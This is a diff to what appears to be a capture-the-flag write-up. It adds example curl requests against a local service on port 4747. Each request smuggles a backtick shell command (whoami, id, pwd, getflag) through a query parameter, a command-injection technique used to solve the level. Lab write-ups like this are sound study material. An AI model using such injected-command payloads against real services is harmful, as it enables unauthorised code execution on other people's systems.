@@ -342,7 +342,20 @@ Solution
         z: scan if a port is open (a listening daemon)
 Connection to localhost 4747 port [tcp/*] succeeded!
 
-> curl localhost:4747/?x="\`/bin/getflag\`"
+# eg.
+> curl localhost:4747/?x="\`/usr/bin/whoami\`" 
+> curl localhost:4747/?x="\`/usr/bin/id\`" 
+> curl localhost:4747/?x="\`/bin/hostname\`" 
+> curl localhost:4747/?x="\`/bin/pwd\`" 
+> curl localhost:4747/?x="\`/bin/df\`" 
+
+# avoid typing realpath out
+> curl localhost:4747/?x="\`$(which pwd)\`" 🟢 
+or
+> curl localhost:4747/?x="\`$(whereis pwd|awk '{print $2}')\`"
+
+# solve
+> curl localhost:4747/?x="\`$(which getflag)\`"
 ```
 
 
